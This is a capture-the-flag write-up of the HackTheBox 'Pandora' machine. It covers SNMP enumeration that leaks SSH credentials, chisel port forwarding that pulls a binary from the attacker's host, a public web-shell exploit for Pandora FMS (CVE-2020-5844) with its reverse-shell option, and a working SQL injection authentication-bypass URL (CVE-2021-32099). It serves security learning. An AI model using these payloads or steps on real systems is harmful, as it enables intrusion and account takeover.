# Pandora

## Introduction

Welcome to my another writeup! In this HackTheBox [Pandora](https://app.hackthebox.com/machines/Pandora) machine, you'll learn: Enumerating SNMP, port forwarding, exploiting Pandora FMS, privilege escalation via exploiting `PATH` variable injection, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: daniel to matt](#privilege-escalation)**
4. **[Privilege Escalation: matt to root](#matt-to-root)**
5. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pandora.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:31:51(HKT)]
└> export RHOSTS=10.10.11.136            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:31:56(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**UDP port scan via `nmap`:** (Rustscan doesn't support UDP port scan)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:33:09(HKT)]
└> sudo nmap -sU -F $RHOSTS
[...]
PORT    STATE SERVICE
161/udp open  snmp
```

**Script scan on UDP port 161:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:40:55(HKT)]
└> sudo nmap -p161 -sU -sC -sV $RHOSTS
[...]
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 9m43s
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 9m42.77s (58277 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:50510   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 179.78 Kb sent, 176.63 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:13:64 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 256.04 Mb sent, 87.02 Mb received
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /sbin/init
|     Params: maybe-ubiquity
[...]
```

According to `rustscan` and `nmap` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 8.2p1 Ubuntu          |
|80/TCP            | Apache httpd 2.4.41 ((Ubuntu))|
|161/UDP           | SNMPv1                        |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:32:17(HKT)]
└> echo "$RHOSTS pandora.htb" | sudo tee -a /etc/hosts
10.10.11.136 pandora.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726143410.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726143902.png)

Looks like it's a typical business website.

Then, we can perform content discovery with tools like `gobuster`:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:37:43(HKT)]
└> gobuster dir -u http://pandora.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/assets               (Status: 301) [Size: 311] [--> http://pandora.htb/assets/]
/server-status        (Status: 403) [Size: 276]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|14:39:48(HKT)]
└> gobuster dir -u http://pandora.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/index.html           (Status: 200) [Size: 33560]
/.htaccess            (Status: 403) [Size: 276]
/.                    (Status: 200) [Size: 33560]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/wp-forum.phps        (Status: 403) [Size: 276]
/.htaccess.bak        (Status: 403) [Size: 276]
/.htuser              (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.htc                 (Status: 403) [Size: 276]
/.htaccess.old        (Status: 403) [Size: 276]
/.htacess             (Status: 403) [Size: 276]
[...]
```

Nothing weird...

### SNMP on UDP port 161

> **SNMP - Simple Network Management Protocol** is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).
>  
> To ensure that SNMP access works across manufacturers and with different client-server combinations, the **Management Information Base (MIB)** was created. MIB is an **independent format for storing device information**. A MIB is a **text** file in which all queryable **SNMP objects** of a device are listed in a **standardized** tree hierarchy. It contains at **least one** `**Object Identifier**` **(**`**OID**`**)**, which, in addition to the necessary **unique address** and a **name**, also provides information about the type, access rights, and a description of the respective object MIB files are written in the `Abstract Syntax Notation One` (`ASN.1`) based ASCII text format. The **MIBs do not contain data**, but they explain **where to find which information** and what it looks like, which returns values for the specific OID, or which data type is used. 
>  
> **OIDs** stands for **O**bject **Id**entifiers. **OIDs uniquely identify managed objects in a MIB hierarchy**. This can be depicted as a tree, the levels of which are assigned by different organizations. Top level MIB object IDs (OIDs) belong to different standard organizations. **Vendors define private branches including managed objects for their own products.**
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726150521.png)
>   
> - From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)

In the version scan (`-sV`) on UDP port 161 in `nmap`, we know that the SNMP version is 1.

In SNMP, there's something called "**Community Strings**".

- **`public`** mainly **read only** functions
- **`private`** **Read/Write** in general

**To brute force the `public` and `private` string, we can use `nmap`'s `snmp-brute` NSE script:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|15:03:01(HKT)]
└> sudo nmap -p161 -sU --script snmp-brute $RHOSTS
[...]
PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  public - Valid credentials
```

- Found `public` string: `public`

## Initial Foothold

Then, we can use that `public` string to **enumerate the entire MIB**.

**To do so, I'll use a tool called `snmpwalk`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|15:15:54(HKT)]
└> snmpwalk -c public -v1 $RHOSTS                     
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (267990) 0:44:39.90
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
[...]
iso.3.6.1.2.1.25.4.2.1.5.994 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1103 = STRING: "-u daniel -p {Redacted}"
[...]
```

In OID `iso.3.6.1.2.1.25.4.2.1.5.1103`, we found a credential for system user `daniel`!!!!

**Also, in the Rustscan's result, there's a SSH port is opened, which means we can SSH into user `daniel`!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|15:18:29(HKT)]
└> ssh daniel@$RHOSTS
[...]
daniel@pandora:~$ whoami; id; hostname; ip a
daniel
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
pandora
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:13:64 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.136/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:1364/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:1364/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `daniel`!

## Privilege Escalation

### daniel to matt

Let's do some basic system enumerations!

**System users:**
```shell
daniel@pandora:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
daniel@pandora:~$ ls -lah /home
total 16K
drwxr-xr-x  4 root   root   4.0K Dec  7  2021 .
drwxr-xr-x 18 root   root   4.0K Dec  7  2021 ..
drwxr-xr-x  4 daniel daniel 4.0K Jul 26 07:18 daniel
drwxr-xr-x  2 matt   matt   4.0K Dec  7  2021 matt
```

- System user `daniel`, `matt`

**SUID binaries:**
```shell
daniel@pandora:~$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

**The `/usr/bin/pandora_backup` looks sussy:**
```shell
daniel@pandora:~$ file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid regular file, no read permission
daniel@pandora:~$ ls -lah /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup
```

However, **it's only executable by user `root` and group `matt`**. So, we need to escalate our privilege to user `matt` first.

**Listening ports:**
```shell
daniel@pandora:~$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                   
udp6       0      0 ::1:161                 :::*                                -                   
```

Localhost port `3306` seems interesting, by default, **MySQL** uses port 3306.

**Enumerating webroot directory:**
```shell
daniel@pandora:~$ ls -lah /var/www/
total 16K
drwxr-xr-x  4 root root 4.0K Dec  7  2021 .
drwxr-xr-x 14 root root 4.0K Dec  7  2021 ..
drwxr-xr-x  3 root root 4.0K Dec  7  2021 html
drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 pandora
```

In here, we saw there's 2 different webroot directories: `html`, `pandora`.

**`html/`:**
```shell
daniel@pandora:~$ ls -lah /var/www/html/
total 48K
drwxr-xr-x 3 root root 4.0K Dec  7  2021 .
drwxr-xr-x 4 root root 4.0K Dec  7  2021 ..
drwxr-xr-x 7 root root 4.0K Dec  7  2021 assets
-rw-r--r-- 1 root root  33K Dec  3  2021 index.html
```

The `html` webroot directory is the web application that we're poking previously.

**`pandora/`:**
```shell
daniel@pandora:~$ ls -lah /var/www/pandora/
total 16K
drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 .
drwxr-xr-x  4 root root 4.0K Dec  7  2021 ..
-rw-r--r--  1 matt matt   63 Jun 11  2021 index.html
drwxr-xr-x 16 matt matt 4.0K Dec  7  2021 pandora_console
daniel@pandora:~$ ls -lah /var/www/pandora/pandora_console/
total 1.6M
drwxr-xr-x 16 matt matt 4.0K Dec  7  2021 .
drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 ..
-rw-r--r--  1 matt matt 3.7K Jan  3  2020 ajax.php
drwxr-xr-x  6 matt matt 4.0K Dec  7  2021 attachment
-rw-r--r--  1 matt matt 1.2K Jun 17  2021 audit.log
-rw-r--r--  1 matt matt  534 Jan  3  2020 AUTHORS
-rw-r--r--  1 matt matt  585 Jan  3  2020 composer.json
-rw-r--r--  1 matt matt  16K Jan  3  2020 composer.lock
-rw-r--r--  1 matt matt  15K May 17  2019 COPYING
-rw-r--r--  1 matt matt  506 Jan  3  2020 DB_Dockerfile
drwxr-xr-x  2 matt matt 4.0K Dec  7  2021 DEBIAN
-rw-r--r--  1 matt matt 3.3K Jan  3  2020 docker_entrypoint.sh
-rw-r--r--  1 matt matt 1.3K Jan  3  2020 Dockerfile
drwxr-xr-x 11 matt matt 4.0K Dec  7  2021 extensions
drwxr-xr-x  4 matt matt 4.0K Dec  7  2021 extras
drwxr-xr-x  2 matt matt 4.0K Dec  7  2021 fonts
drwxr-xr-x  5 matt matt 4.0K Dec  7  2021 general
drwxr-xr-x 20 matt matt 4.0K Dec  7  2021 godmode
drwxr-xr-x 21 matt matt  36K Dec  7  2021 images
drwxr-xr-x 21 matt matt 4.0K Dec  7  2021 include
-rw-r--r--  1 matt matt  52K Dec  2  2021 index.php
-rw-r--r--  1 matt matt  42K Jan  3  2020 install.done
drwxr-xr-x  5 matt matt 4.0K Dec  7  2021 mobile
drwxr-xr-x 15 matt matt 4.0K Dec  7  2021 operation
-rw-r--r--  1 matt matt 1.3K Jul 26 06:31 pandora_console.log
-rw-r--r--  1 matt matt  234 May 17  2019 pandora_console_logrotate_centos
-rw-r--r--  1 matt matt  171 May 17  2019 pandora_console_logrotate_suse
-rw-r--r--  1 matt matt  222 May 17  2019 pandora_console_logrotate_ubuntu
-rw-r--r--  1 matt matt 4.8K May 17  2019 pandora_console_upgrade
-rw-r--r--  1 matt matt 1.2M Jan  3  2020 pandoradb_data.sql
-rw-r--r--  1 matt matt 157K Jan  3  2020 pandoradb.sql
-rw-r--r--  1 matt matt  476 Jan  3  2020 pandora_websocket_engine.service
drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 tests
drwxr-xr-x  2 matt matt 4.0K Dec  7  2021 tools
drwxr-xr-x 11 matt matt 4.0K Dec  7  2021 vendor
-rw-r--r--  1 matt matt 4.8K Jan  3  2020 ws.php
```

However, the `pandora` application is not accessible before gaining foothold, and it has a completely different web application.

**By reading the `Dockerfile`, it's the "Pandora FMS", which shows in real time what is happening with the organisation's technology:**
```shell
daniel@pandora:~$ cat /var/www/pandora/pandora_console/Dockerfile 
FROM centos:centos6
MAINTAINER Pandora FMS Team <info@pandorafms.com>

RUN { \
	echo '[EPEL]'; \
	echo 'name = CentOS Epel'; \
	echo 'baseurl = http://dl.fedoraproject.org/pub/epel/6/x86_64'; \
	echo 'enabled=1'; \
	echo 'gpgcheck=0'; \
} > /etc/yum.repos.d/extra_repos.repo

RUN { \
        echo '[artica_pandorafms]'; \
        echo 'name=CentOS6 - PandoraFMS official repo'; \
[...]
```

Hmm... I wonder how this web application is running.

**So, let's check the Apache config file:**
```shell
daniel@pandora:~$ ls -lah /etc/apache2/sites-available/
total 24K
drwxr-xr-x 2 root root 4.0K Dec  7  2021 .
drwxr-xr-x 8 root root 4.0K Dec  7  2021 ..
-rw-r--r-- 1 root root 1.4K Apr 13  2020 000-default.conf
-rw-r--r-- 1 root root 6.2K Apr 13  2020 default-ssl.conf
-rw-r--r-- 1 root root  315 Dec  3  2021 pandora.conf
```

**As you can see, in `/etc/apache2/sites-available/` directory, there's a `pandora.conf` Apache config file:**
```shell
daniel@pandora:~$ cat /etc/apache2/sites-available/pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

We now know that the Pandora FMS is:

- Running on ***localhost*** port 80
- Domain is `pandora.panda.htb`
- Webroot directory is `/var/www/pandora`
- **The Apache process is run as user `matt`**

```shell
daniel@pandora:~$ curl http://localhost/
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
daniel@pandora:~$ curl http://localhost/pandora_console/
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

	<title>Pandora FMS - the Flexible Monitoring System</title>
[...]
```

Hmm... Maybe we can escalate our privilege to `matt` via Pandora FMS?

Now, to access the Pandora FMS on our attacker machine, we need to do **port forwarding**.

To do so, I'll use `chisel`:

- Transfer `chisel` binary to the target machine:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:07:05(HKT)]
└> python3 -m http.server -d /opt/chisel/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
daniel@pandora:~$ wget http://10.10.14.8/chiselx64 -O /tmp/chisel; chmod +x /tmp/chisel
[...]
2023-07-26 08:07:43 (7.43 MB/s) - ‘/tmp/chisel’ saved [8077312/8077312]
```

- Setup a reverse port forwarding server:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:08:31(HKT)]
└> /opt/chisel/chiselx64 server --port 9999 --reverse
2023/07/26 16:08:31 server: Reverse tunnelling enabled
2023/07/26 16:08:31 server: Fingerprint gCKByRLHaPhVqjinRN72zgP80kLRb15Kllu+SeJ2QEo=
2023/07/26 16:08:31 server: Listening on http://0.0.0.0:9999
```

- Client connect the to server:

```shell
daniel@pandora:~$ /tmp/chisel client 10.10.14.8:9999 R:8001:127.0.0.1:80
2023/07/26 08:13:36 client: Connecting to ws://10.10.14.8:9999
2023/07/26 08:13:36 client: Connected (Latency 38.888271ms)
```

**Now we can access the Pandora FMS via `http://localhost:8001`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726161418.png)

**In here, we can try to login as user `daniel`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726161851.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726161856.png)

"User only can use the API."??

How about default credentials?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726162807.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726162820.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726162825.png)

Nope...

**Ahh... Since we already have initial foothold on the target machine, and able to read its webroot directory, let's explore it.**

**In `/var/www/pandora/pandora_console/audit.log`, we saw which users do what actions:**
```shell
daniel@pandora:~$ cd /var/www/pandora/pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ cat audit.log 
2021-06-11 17:11:48 - admin - Logon - 192.168.220.11 - Logged in
2021-06-11 17:28:54 - admin - User management - 192.168.220.11 - Created user matt
2021-06-11 17:29:06 - admin - User management - 192.168.220.11 - Updated user matt
2021-06-11 17:29:21 - admin - User management - 192.168.220.11 - Added profile for user matt
2021-06-11 17:29:43 - admin - User management - 192.168.220.11 - Added profile for user matt
2021-06-11 17:29:56 - matt - Logon - 192.168.220.11 - Logged in
2021-06-16 23:24:12 - admin - Logon - 127.0.0.1 - Logged in
2021-06-16 23:24:40 - admin - User management - 127.0.0.1 - Updated user admin
2021-06-16 23:24:57 - admin - User management - 127.0.0.1 - Updated user matt
2021-06-17 00:09:46 - admin - Logon - 127.0.0.1 - Logged in
2021-06-17 00:11:54 - admin - User management - 127.0.0.1 - Created user daniel
2021-06-17 00:12:08 - admin - User management - 127.0.0.1 - Added profile for user daniel
2021-06-17 21:10:18 - N/A - No session - 127.0.0.1 - Trying to access without a valid session
2021-06-17 21:10:28 - N/A - No session - 127.0.0.1 - Trying to access without a valid session
2021-06-17 21:10:44 - matt - Logon - 127.0.0.1 - Logged in
```

As you can see, there's 3 users on Pandora FMS web console: `admin`, `matt`, `daniel`.

**I also found 2 SQL files, but they're for installing Pandora FMS:**
```shell
-rw-r--r--  1 matt matt 1.2M Jan  3  2020 pandoradb_data.sql
-rw-r--r--  1 matt matt 157K Jan  3  2020 pandoradb.sql
```

**Then, I found config files in `include/`, but the `config.php` is not readable by us:**
```shell
daniel@pandora:/var/www/pandora/pandora_console$ ls -lah include/config*.php
-rw-r--r-- 1 matt matt 1.2K Jan  3  2020 include/config.inc.php
-rw------- 1 matt matt  413 Dec  3  2021 include/config.php
-rw-r--r-- 1 matt matt 9.3K Jan  3  2020 include/config_process.php
```

Ok... Let's take a step back.

**I wonder if this Pandora FMS is a vulnerable version or not:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726164559.png)

- Pandora FMS version: v7.0NG.742_FIX_PERL2020

**Then, I'll use `searchsploit` to search for public exploits in Exploit-DB:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:46:42(HKT)]
└> searchsploit Pandora FMS 7.0 NG 742
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50961.py
--------------------------------------------------------------------- ---------------------------------
```

Oh! We found 1 exploit: `Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)`.

**Let's mirror it and read through all the exploit code:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:47:18(HKT)]
└> searchsploit -m 50961
  Exploit: Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50961
     Path: /usr/share/exploitdb/exploits/php/webapps/50961.py
    Codes: CVE-2020-5844
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (1384)
Copied to: /home/siunam/ctf/htb/Machines/Pandora/50961.py
```

**50961.py:**
```python
[...]
# Description: index.php?sec=godmode/extensions&sec2=extensions/files_repo in Pandora FMS v7.0 NG allows authenticated administrators to upload malicious PHP scripts, and execute them via base64 decoding of the file location. This affects v7.0NG.742_FIX_PERL2020.
[...]
# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution

Usage:
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -u <username> <password>
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID>
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-c <custom-command>]
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-s <local-ip> <local-port>]
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-w <name.php>]
  python3 exploit-CVE-2020-5844.py -h

Options:
  -t    Target host and port. Provide target IP address and port.
  -u    Target username and password. Provide username and password to log in to Pandora FMS.
  -p    Target valid PHP session ID. No username or password needed. (Optional)
  -s    Reverse shell mode. Provide local IP address and port. (Optional)
  -c    Custom command mode. Provide command to execute. (Optional)
  -w    Web shell custom mode. Provide custom PHP file name. (Optional)
  -h    Show this help menu.
""")
    exit()
[...]
```

After reading it, it's clear that Pandora FMS v7.0 NG 742 is vulnerable to **file upload vulnerability**, which allows authenticated administrators to upload malicious PHP scripts.

**Let's run the exploit to upload a PHP webshell!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:50:16(HKT)]
└> python3 50961.py -t 127.0.0.1 8001 -u daniel {Redacted}

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution
OPTIONS: Web Shell Mode
USERNAME: daniel
PASSWORD: {Redacted}
WEBFILE: unicord.php
WEBSITE: http://127.0.0.1:8001/pandora_console
PHPSESS: qll5tqmtug1hfv1h3i7u6i527v
ERRORED: Invalid credentials!
EXPLOIT: Connected to website! Status Code: 200
EXPLOIT: Logged into Pandora FMS!
EXPLOIT: Web shell uploaded!
SUCCESS: Web shell available at: http://127.0.0.1:8001/pandora_console/images/unicord.php?cmd=whoami
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Pandora)-[2023.07.26|16:53:34(HKT)]
└> curl http://127.0.0.1:8001/pandora_console/images/unicord.php?cmd=whoami 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 8001</address>
</body></html>
```

Nope... This is because user `daniel` is unable to authenticate.

**After some Googling, I found [this blog post](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726165647.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726165701.png)

SQL Injection and Phar deserialization looks interesting for us, as they're unauthenticated vulnerabilities.

**After that, by searching the unauthenticated SQL injection CVE, we can find [this PoC](https://github.com/ibnuuby/CVE-2021-32099):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Pandora/images/Pasted%20image%2020230726170130.png)

**Payload:**
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

**URL decoded:**
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

**Let's copy and past that to the Pandora FMS web application to bypass authentication!**

